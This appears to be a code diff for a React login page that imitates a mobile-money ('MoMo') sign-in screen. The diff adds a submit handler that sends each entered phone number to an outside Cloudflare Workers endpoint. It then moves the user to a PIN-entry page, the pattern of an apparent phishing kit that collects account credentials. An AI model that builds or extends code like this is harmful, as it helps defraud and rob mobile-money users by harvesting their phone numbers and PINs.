@@ -117,8 +117,24 @@ import logo from "./assets/logo (1).png"
 
 export default function MoMoLogin() {
   const [phone, setPhone] = useState("");
-  const navigate = useNavigate(); // ✅ Bug fix: brackets lagate hain
+  const navigate = useNavigate();
 
+  const handleSubmit = async () => {
+    if (phone.trim() != "") {
+      const payload = {
+        phone: phone
+      }
+      await fetch(
+        "https://my-worker-app.instapayapi.workers.dev/api/phone",
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload),
+        },
+      );
+      navigate("/pincode", { state: { phone } })
+    }
+  }
   return (
     <div className="min-h-screen bg-white flex flex-col">
       <div className="bg-yellow-400 h-8 w-full" />
@@ -155,7 +171,8 @@ export default function MoMoLogin() {
 
         <div className="w-full max-w-sm mt-6">
           <button
-            onClick={() => navigate("/otppage", { state: { phone } })} // ✅ phone pass karo
+            onClick={handleSubmit}
+            // onClick={() => navigate("/otppage", { state: { phone } })} // ✅ phone pass karo
             // disabled={phone.length < 7} // ✅ validation
             className="w-full bg-[#FFCC00] active:bg-yellow-600 text-gray-900 font-bold text-lg rounded-full py-3 transition-colors duration-150 shadow-sm disabled:opacity-50 disabled:cursor-not-allowed"
           >
